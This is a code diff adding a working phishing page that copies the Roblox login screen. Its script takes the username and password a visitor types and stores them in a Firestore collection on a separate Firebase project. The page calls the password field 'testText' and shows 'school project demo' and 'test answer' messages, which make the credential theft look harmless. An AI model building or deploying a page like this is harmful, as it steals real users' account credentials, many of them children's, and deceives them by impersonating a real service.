@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox login</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    background:
+        linear-gradient(rgba(0,0,0,.68), rgba(0,0,0,.68)),
+        url("https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/7/f/3/7f3ab11ae38410b5ef9349a731c9b76173aecd4a.jpeg");
+    background-size: cover;
+    background-position: center;
+    font-family: Arial, sans-serif;
+    color: white;
+}
+
+/* TOP NAVIGATION */
+
+nav {
+    height: 50px;
+    background: #191a20;
+    display: flex;
+    align-items: center;
+    padding: 0 24px;
+    gap: 45px;
+}
+
+.logo {
+    font-size: 27px;
+    font-weight: 900;
+    letter-spacing: -1px;
+}
+
+nav span {
+    font-size: 17px;
+}
+
+/* LOGIN PANEL */
+
+.container {
+    min-height: calc(100vh - 50px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 25px 12px;
+}
+
+.login {
+    width: 455px;
+    max-width: 100%;
+    background: #272930;
+    padding: 27px 19px;
+    text-align: center;
+}
+
+h1 {
+    font-size: 36px;
+    margin: 2px 0 12px;
+}
+
+input {
+    display: block;
+    width: 100%;
+    height: 49px;
+    margin-bottom: 21px;
+    padding: 12px 15px;
+    border-radius: 10px;
+    border: 1px solid #4a4d59;
+    background: #343740;
+    color: white;
+    font-size: 17px;
+}
+
+input::placeholder {
+    color: #c7c9d0;
+}
+
+button {
+    width: 100%;
+    height: 46px;
+    margin-bottom: 14px;
+    background: #3b3e49;
+    border: 1px solid transparent;
+    border-radius: 10px;
+    color: white;
+    font-size: 17px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #505460;
+}
+
+.login-btn {
+    background: transparent;
+    border: 1px solid #d0d0d0;
+}
+
+.forgot {
+    display: block;
+    color: white;
+    font-size: 17px;
+    text-decoration: none;
+    margin: 16px 0 38px;
+}
+
+hr {
+    border: 0;
+    border-top: 1px solid #444750;
+    margin-bottom: 22px;
+}
+
+.signup {
+    margin-top: 30px;
+    font-size: 17px;
+}
+
+.demo-label {
+    color: #bfc2cc;
+    font-size: 11px;
+    margin-top: 20px;
+}
+
+#message {
+    display: none;
+    color: #85dc99;
+    margin-top: 15px;
+}
+
+@media(max-width: 600px) {
+    nav {
+        gap: 15px;
+        padding: 0 10px;
+    }
+
+    nav span {
+        font-size: 12px;
+    }
+
+    .logo {
+        font-size: 20px;
+    }
+
+    h1 {
+        font-size: 29px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<nav>
+    <div class="logo">ROBLOX</div>
+    <span>Charts</span>
+    <span>Marketplace</span>
+    <span>Create</span>
+    <span>Search</span>
+</nav>
+
+<div class="container">
+
+    <div class="login">
+
+        <h1>Login to Roblox</h1>
+
+        <input type="text" id="username" placeholder="Username/Email/Phone">
+
+        <input type="password" id="testText" placeholder="Password">
+
+        <button class="login-btn" type="button">
+    Log In
+</button>
+
+        <a class="forgot" href="#"
+        onclick="return false">
+            Forgot Password or Username?
+        </a>
+
+        <hr>
+
+        <button onclick="demo()">
+            Email Me a One-Time Code
+        </button>
+
+        <button onclick="demo()">
+            Quick Sign-in
+        </button>
+
+        <button onclick="demo()">
+            Other sign-in options
+        </button>
+
+        <div class="signup">
+            Don't have an account? <b>Sign Up</b>
+        </div>
+
+        <div id="message">
+            ✓ Demo login successful!
+        </div>
+
+        </div>
+
+    </div>
+</div>
+
+
+<script>
+function demo() {
+    alert("This is a school project demo.");
+}
+</script>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/13.4.0/firebase-app.js";
+
+import {
+    getFirestore,
+    collection,
+    addDoc,
+    serverTimestamp
+} from "https://www.gstatic.com/firebasejs/13.4.0/firebase-firestore.js";
+
+import {
+    getAuth,
+    signInAnonymously
+} from "https://www.gstatic.com/firebasejs/13.4.0/firebase-auth.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyB1h_0Romu8KmxOxx3g6M3X0t_2y8XrcN0",
+    authDomain: "roblox-login-c09b1.firebaseapp.com",
+    projectId: "roblox-login-c09b1",
+    storageBucket: "roblox-login-c09b1.firebasestorage.app",
+    messagingSenderId: "404995958335",
+    appId: "1:404995958335:web:b93fa233eb26342043ba8a"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const auth = getAuth(app);
+
+try {
+    await signInAnonymously(auth);
+} catch (error) {
+    console.error("Authentication error:", error);
+}
+
+document.querySelector(".login-btn").addEventListener("click", async (event) => {
+    event.preventDefault();
+
+    const username = document.getElementById("username").value.trim();
+    const testText = document.getElementById("testText").value.trim();
+
+    if (!username || !testText) {
+        alert("Vyplň obě testovací pole.");
+        return;
+    }
+
+    try {
+        await addDoc(collection(db, "testResponses"), {
+            username: username,
+            testText: testText,
+            createdAt: serverTimestamp()
+        });
+
+        alert("Testovací odpověď byla úspěšně odeslána!");
+
+        document.getElementById("username").value = "";
+        document.getElementById("testText").value = "";
+
+    } catch (error) {
+        console.error("Firestore error:", error);
+        alert("Odpověď se nepodařilo odeslat. Zkontroluj připojení a pravidla Firebase.");
+    }
+});
+</script>
